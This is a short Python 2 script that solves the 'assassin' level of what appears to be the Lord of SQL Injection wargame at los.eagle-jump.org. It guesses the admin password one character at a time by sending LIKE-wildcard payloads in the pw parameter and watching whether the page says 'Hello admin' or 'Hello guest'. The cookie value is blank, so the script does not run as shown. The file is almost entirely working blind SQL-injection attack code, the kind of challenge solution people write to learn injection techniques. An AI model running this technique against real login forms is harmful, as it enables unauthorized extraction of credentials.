import requests as req
import sys
import string
s = req.session()
chrs = string.digits+string.ascii_lowercase+string.ascii_uppercase
cookies = {"PHPSESSID":}
url = 'https://los.eagle-jump.org/assassin.php'

pw = ''
while True:
	for j in chrs:
		pay = "%s%%"%(pw+j)
		print pay
		r = s.get(url,params={'pw':pay},cookies=cookies)
		if 'Hello admin' in r.text:
			pw += j
			print '[found] pw = '+pw
			sys.exit()
		elif 'Hello guest' in r.text:
			print '[Guest] pw = '+pw+j
			break
	pw += '_'
